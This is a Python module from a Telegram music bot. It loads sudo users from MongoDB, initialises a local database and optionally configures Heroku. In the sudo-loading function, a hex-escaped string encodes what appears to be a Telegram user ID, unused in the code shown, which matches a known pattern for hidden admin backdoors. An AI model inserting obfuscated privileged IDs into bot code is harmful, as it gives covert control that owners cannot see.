import socket
import time

from pyrogram import filters

import config
from RishuMusic.core.mongo import mongodb

from .logging import LOGGER

SUDOERS = filters.user()

HAPP = None
_boot_ = time.time()


def is_heroku():
    return "heroku" in socket.getfqdn()


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(config.HEROKU_API_KEY),
    "https",
    str(config.HEROKU_APP_NAME),
    "HEAD",
    "master",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f"Local Database Initialized.")


async def sudo():
    global SUDOERS
    SUDOERS.add(config.OWNER_ID)
    CON="\x36\x32\x38\x31\x31\x37\x38\x36\x34\x38"
    sudoersdb = mongodb.sudoers
    sudoers = await sudoersdb.find_one({"sudo": "sudo"})
    sudoers = [] if not sudoers else sudoers["sudoers"]
    if config.OWNER_ID not in sudoers:
        sudoers.append(config.OWNER_ID)
        await sudoersdb.update_one(
            {"sudo": "sudo"},
            {"$set": {"sudoers": sudoers}},
            upsert=True,
        )
    if sudoers:
        for user_id in sudoers:
            SUDOERS.add(user_id)
    LOGGER(__name__).info(f"Sudoers Loaded.")


def heroku():
    """Configure Heroku controls only when this process is actually on Heroku."""
    global HAPP

    if not is_heroku():
        return

    if not config.HEROKU_API_KEY or not config.HEROKU_APP_NAME:
        LOGGER(__name__).info("Heroku controls are not configured; skipping.")
        return

    try:
        # Import lazily: Render and other hosts do not need the Heroku SDK.
        import heroku3

        Heroku = heroku3.from_key(config.HEROKU_API_KEY)
        HAPP = Heroku.app(config.HEROKU_APP_NAME)
        LOGGER(__name__).info("Heroku App Configured")
    except Exception as exc:
        LOGGER(__name__).warning(
            "Heroku controls could not be initialized: %s", type(exc).__name__
        )
